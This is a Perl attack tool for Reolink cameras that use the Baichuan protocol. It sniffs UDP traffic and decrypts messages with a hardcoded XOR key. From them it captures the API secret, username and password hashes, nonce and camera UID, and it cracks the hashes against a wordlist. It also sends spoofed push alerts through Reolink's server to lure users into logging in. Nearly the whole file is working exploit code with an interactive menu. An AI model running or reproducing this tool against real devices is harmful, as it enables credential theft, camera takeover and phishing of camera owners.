#!/usr/bin/env perl
#
# Author:	aut0exec
# Version:	V0.1
# Date: 	May 4, 2022
# Synopsis:	Program to capture and crack baichuan data for Reolink cameras
#
# To Do:
# 1) Add functionality to capture Alert messages for API secret
# 2) Add functionality to send spoofed Alert to trick user into logging into camera
# 2a) This works but can the POST data be cleaned up?
# 3) Add functionality to capture camera's UID from sysinfo messages
# 4) Add menu to allow user to perform actions after packet capture
# --- Menu items: others?
# 5) Add other protocols/devices? Supposedly Swann uses Baichuan as well...
# 6) https://github.com/spicesouls/reosploit - Looks like this python code has other neat functions
# --- Appears to be for older reolink devices
# 
# Known issues:
# 1) IP fragmentation not handled
# 2) Multiple Baichuan devices not supported; Important to use $TARGET!

use strict;
use warnings;
use Net::Pcap::Easy;
use Digest::MD5 qw(md5_hex);
use POSIX qw(strftime);
use HTTP::Request ();
use LWP::UserAgent ();

my $TARGET = '172.16.0.90';
my $WORDLIST = '/usr/share/wordlists/rockyou.txt';
my @baichuan_key = qw (1f 2d 3c 4b 5a 69 78 ff);
my $ctrl_c;
my $npe;
my %camera_data;
my %cracked_data;

sub capture_traffic {

	print ("Starting packet capture.\nData will show as it is captured.\nPress Ctrl+c to exit...\n");

	$npe = Net::Pcap::Easy->new(
	dev              => "wlx00c0ca98c095",
#	dev              => "enp0s3",
	filter           => "udp and host $TARGET and not port 67 and not port 9000 and not port 9999 and not port 1900 and not port 5353 and not port 443",
	packets_per_loop => 1,
	bytes_to_capture => 2048,
	promiscuous      => 0,

	udp_callback => sub {
		my ($npe, $ether, $ip, $udp, $header ) = @_;
		my $xmit = localtime( $header->{tv_sec} );

		# Match the Baichuan application headers and search for login messages
		# This will likely capture 4 messages
		# 1: Legacy login message
		# 2: Nonce from device "encrypted"
		# 3: Credentials from App "encrypted"
		# 4: Packet of camera's sysinfo; API secret is in this packet "encrypted"
		if ( $udp->{data} =~ /^\x10\xcf\x87\x2a.*\xf0\xde\xbc\x0a\x01\x00.*/ or $udp->{data} =~ /^\x3a\xcf\x87\x2a.*/)
		{
			# Debug: Print IP:Port information
			print "$xmit UDP: $ip->{src_ip}:$udp->{src_port}"
			 . " -> $ip->{dest_ip}:$udp->{dest_port}\n";
			# Debug: Print MAC information
			#print "\t$ether->{src_mac} -> $ether->{dest_mac}\n";

			# Baichuan UDP header is 20 bytes
			my $bai_udp_data = unpack("H40", $udp->{data});
			my $bai_packet_nums = unpack("x12 C", $udp->{data});
			my $bai_app_header_len = 40;

			if ($bai_packet_nums > 0) { $bai_app_header_len = 44; }

			# Debug: Print Baichuan header information
			#print "Baichuan UDP Header data: " . $bai_udp_data . "\n";
			#print "Baichuan number of Packet(s): " . $bai_packet_nums . "\n";

			# Baichuan App header varies in length it seems...
			# Appears to be dependent on the number of UDP packets that need to be sent
			# -- If $bai_packet_nums > 0 header seems to be 24 bytes
			my $i = 0;
			my $j = 0;
			my $dec = '';

			if ( $udp->{data} =~ /^\x10\xcf\x87\x2a.*\xf0\xde\xbc\x0a\x01\x00.*/ )
			{ 
				my $bai_app_data = unpack("x20 H${bai_app_header_len}", $udp->{data});
				#print "Baichuan Applicaton header data: " . $bai_app_data . "\n"; 

				# Baichuan Payload data
				my $bai_payload_data = unpack("x${bai_app_header_len} H*", $udp->{data});
				#print ("Baichuan payload: " . $bai_payload_data . "\n");
			
				# Decryption routine for XML payloads 
				# Make this a sub later...
				for (my $i=0; $i < length($bai_payload_data); $i+=2)
				{
					my $char = pack("H2", substr($bai_payload_data, $i, 2));
					my $key_char = pack("H2", $baichuan_key[$j]);

					$dec .= $char^$key_char;
					if ( $j >= 7) { $j = 0; }
					else { $j++; }

				}
			}

			# Decrypt periodic Baichuan messages
			# This packet uses a different encryption scheme as well
			if ($udp->{data} =~ /^\x3a\xcf\x87\x2a.*/)
			{
				my $bai_app_data = unpack("x20 H${bai_app_header_len}", $udp->{data});
				#print "Baichuan Applicaton header data: " . $bai_app_data . "\n"; 
				print ("CAPTURED: \"Encrypted\" Keep-alive message\n"); 

				# Decryption routine for periodic heartbeats
				# Make this a sub later...

			}

			# Extract sensitive data from decrypted data
			for my $line (split /\n/, $dec)
			{
				if ( $line =~ /^<(secretCode)>([A-Fa-f0-9]+)<\/secretCode>$/ )
				{ 
					if ( ! exists($camera_data{$1}) )
					{ 
						$camera_data{$1} = $2;
						print ("CAPTURED - API Secret Token: $camera_data{secretCode} \n"); 
					}
				}

				if ( $line =~ /^<(userName)>([A-Fa-f0-9]+)<\/userName>$/ )
				{
					if ( ! exists($camera_data{$1}) )
					{ 
						$camera_data{$1} = $2;
						print ("CAPTURED - Username Hash: $camera_data{userName} \n"); 
					}
				}

				if ( $line =~ /^<(password)>([A-Fa-f0-9]+)<\/password>$/ )
				{
					if ( ! exists($camera_data{$1}) )
					{ 
						$camera_data{$1} = $2;
						print ("CAPTURED - Password Hash: $camera_data{password} \n"); 
					}

				}

				if ( $line =~ /^\s+<(nonce)>(.*)<\/nonce>$/ )
				{
					if ( ! exists($camera_data{$1}) )
					{ 
						$camera_data{$1} = $2;
						print ("CAPTURED - Nonce: $camera_data{nonce} \n"); 
					}
				}

#               if ( $line =~ /<(uid)>([A-Fa-f0-9]+)<\/uid>$/ )
               if ( $line =~ /(^952700[A-Z0-9]{10})\x00.*/ )
               {
                   if ( ! exists($camera_data{$1}) )
                   { 
                       $camera_data{$1} = $2;
                       print ("CAPTURED - Camera UID: $camera_data{uid} \n"); 
                   }
               }
			}
		}
	},
);

	while ($npe->loop) { process_data(); }

	wait_for_input();
}

$SIG{INT} = sub { $ctrl_c = 1;};

sub process_data {
	return if not $ctrl_c;

	local $SIG{INT} = 'IGNORE';
	$ctrl_c = undef;

	$npe->close;
	print ("\nClosing Capture.\n");
}

sub print_capture_data {

	while (my ($key, $value) = each %camera_data) 
	{ print ( "CAPTURED: $key -> $value \n" ); }

	wait_for_input();
}

sub print_cracked_data {

	while (my ($key, $value) = each %cracked_data) 
	{ print ( "Cracked: $key -> $value \n" ); }

	wait_for_input();
}

sub wait_for_input() {
    print "\nPress 'Enter' to continue...";
    chomp(my $key = <STDIN>);
}

sub crack_hashes {	

	if ( ! exists $camera_data{password} && ! exists $camera_data{userName} && ! exists $camera_data{nonce} )
	{ missing_data(); return;}

	my ($pass_complete, $user_complete) = (0,0);
	my $wordlist;

	while ()
	{
		print ("\nPlease enter path to wordlist to use:  ");
		chomp( $wordlist = <STDIN>);

		if ( -e -f -r "$wordlist" )
		{ last;	}
		else
		{ 
			print ("Error with file: ${wordlist}\nCheck file exists and we can read it!"); 
			sleep 2;
		}
	}

	print ("\nUsing wordlist: $wordlist to attempt to crack user and password hashes.\n");

	open(FH, '<', $wordlist) or die "Couldn't open file: $wordlist";
	while (<FH>)
	{
		chomp($_);
		my $guess = uc(substr(md5_hex("$_"."$camera_data{nonce}"), 0, -1));
		#print ("MD5 calc was: $guess \nMD5 wire was: $camera_data{password} \n");

		if ( $pass_complete == 0 && "$guess" eq "$camera_data{password}" )
		{
			print ("\nSUCCESS: Password hash match found with: $_");
			$cracked_data{Password} = $_;				
			$pass_complete = 1;
		}
		if ( $user_complete == 0 && "$guess" eq "$camera_data{userName}" )
		{
			print ("\nSUCCESS: Username hash match found with: $_");
			$cracked_data{Username} = $_;				
			$user_complete = 1;
		}
		if ( $user_complete == 1 && $pass_complete == 1 ) { last; }
	}
	close(FH) || die "Error closing file!";

	if ( $pass_complete eq 0 )
	{ print ("\nFAIL: Unable to crack password hash. Try another wordlist.");	}
	if ( $user_complete eq 0 )
	{ print ("\nFAIL: Unable to crack username hash. Try another wordlist.");	}

	wait_for_input();
}

sub missing_data {

	(my $HD = <<EOF) =~ s/^\s+//gm;
	 Doesn't appear that necessary data was captured to crack hashes.\n
	 -- This often occurs if the capture didn't run long enough.
	 -- May also mean nothing attempted to access the camera while the capture was running.
EOF
	print ("\n$HD");

	wait_for_input();
}

sub send_alert {

	if ( ! exists $camera_data{secretCode} )
	{ 
		print ("\nERROR: Can't send push notification without secret key! Capture data first!");
		wait_for_input();
		return;
	}

	my $message = '';
	my $title = '';
	my $model = '';
	my $secret = "$camera_data{secretCode}";
	my $timestr = strftime "%Y-%m-%dT%T.000%z", localtime;
	my $uid = 'XXXXXXXXXXXXXXXX'; # Set statically for testin; needs to be pulled from a baichaun message
	my $url = "http://pushx.reolink.com\/devices\/$uid\/notifications";
	my $header = ['Host' => 'pushx.reolink.com', 'X-REO-PUSH-VERSION' => '3'];

	print ("\nPlease enter alert title: ");
	chomp ( $title = <STDIN>);

	print ("Please enter alert message: ");
	chomp ( $message = <STDIN>);

	print ("Please enter Camera Model: ");
	chomp ( $model = <STDIN>);

#	my %data = ( 
#				 secret => "$secret",
#				 type => 'alarm',
#				 alarm => undef,
#				 message => 'Oh no!',
#				 name => 'PIR Motion Sensor',
#				 type => 'RF',
#				 device => 'Some Camera',
#				 channelName => '',
#				 title => "$message",
#				 'channel' => '1',
#				 'deviceModel' => "$model",
#				 'alarmTime' => "$timestr",
#				);
	my $data = "{\"secret\":\"$secret\",\"type\":\"alarm\",\"alarm\":{\"message\":\"$message\",\"name\":\"PIR Motion Sensor\",\"type\":\"RF\",\"device\":\"Camera\",\"channelName\":\"\",\"title\":\"$title\",\"channel\":1,\"deviceModel\":\"$model\",\"alarmTime\":\"$timestr\"}}";

	my $request = HTTP::Request->new('POST', $url, $header, $data);
	my $ua = LWP::UserAgent->new( agent => "");
	my $result = $ua->request($request);

	print ("\nResponse from server: ", $result->status_line);

	wait_for_input();
}

sub clear_data {

	while ( 1 ) 
	{
		system("clear");

		print ("Which data would you like to clear?");
		print ("\n1. Captured data");
		print ("\n2. Cracked data");
		print ("\n3. All data");
		print ("\n0. Cancel");
		print ("\n\nChoice: ");

		my $action = substr(<STDIN>, 0, 1);		

		if ( $action !~ /^[0123]$/ )
            { print("Invalid entry!\n"); sleep 1; }
        elsif ( $action == 1 )
            { %camera_data = (); last; }
        elsif ( $action == 2 )
            { %cracked_data = (); last; }
        elsif ( $action == 3 )
            { %camera_data = (); %cracked_data = (); last; }
		elsif ( $action == 0 )
			{ return; }
	}

	print ("Requested data cleared!\n");
	sleep 1;
}

sub main_menu {

	while ( 1 )
	{
		system ("clear");

		print ("----- Menu options -----\n");
		print ("1. Sniff interface for Baichuan data\n");
		print ("2. Sniff and crack network recovered hashes\n");
		print ("3. Send spoofed alert\n");
		print ("4. Crack manually recovered hashes - (Not implemented)\n");
		print ("5. Crack recovered hashes\n");
		print ("6. Print captured data\n");
		print ("7. Print cracked data\n");
		print ("8. Clear data\n");
		print ("0. Exit program\n");
		print ("\nChoice: ");

		my $option = substr(<STDIN>, 0, 1);

		if ( $option !~ /^[012345678]$/ )
			{ print("Invalid entry!\n"); sleep 2; }		
		elsif ( $option == 1 )
			{ capture_traffic(); }
		elsif ( $option == 2 ) 
			{ capture_traffic(); crack_hashes(); }
		elsif ( $option == 3 ) 
			{ send_alert(); }
		elsif ( $option == 4 ) 
			{ print ("\nRan 4"); }
		elsif ( $option == 5 ) 
			{ crack_hashes(); }
		elsif ( $option == 6 ) 
			{ print_capture_data(); }
		elsif ( $option == 7 ) 
			{ print_cracked_data(); }
		elsif ( $option == 8 ) 
			{ clear_data(); }
		elsif ( $option == 0 )
			{ print("\nHappy Hacking! :-)\n\n"); exit 0; }
	}
}

main_menu();

print ("Exit outside of main menu; something bad happened....");
exit 100;
